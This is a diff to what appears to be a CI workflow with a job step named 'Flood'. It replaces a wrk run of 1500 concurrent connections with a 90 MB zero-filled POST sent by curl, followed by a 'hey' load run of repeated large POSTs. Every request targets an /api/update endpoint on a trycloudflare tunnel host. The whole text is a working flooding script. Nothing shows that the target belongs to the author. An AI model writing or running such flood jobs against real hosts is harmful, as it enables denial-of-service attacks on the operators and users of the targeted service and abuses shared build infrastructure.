@@ -6,5 +6,7 @@ jobs:
     steps:
       - name: Flood
         run: |
-          sudo apt-get install -y wrk
-          wrk -t 4 -c 1500 -d 1m http://herb-cheaper-hollywood-refined.trycloudflare.com/api/update
+          dd if=/dev/zero of=payload.bin bs=1M count=90
+          curl -o /dev/null -s -w "\nHTTP Статус: %{http_code}\nВремя: %{time_total} сек\nСкорость: %{speed_upload} байт/сек\n\n" -X POST -H "Content-Type: application/octet-stream" --data-binary @payload.bin http://herb-cheaper-hollywood-refined.trycloudflare.com/api/update
+          sudo apt update && sudo apt install -y hey
+          hey -n 50 -c 10 -m POST -D payload.bin -T "application/octet-stream" http://herb-cheaper-hollywood-refined.trycloudflare.com/api/update
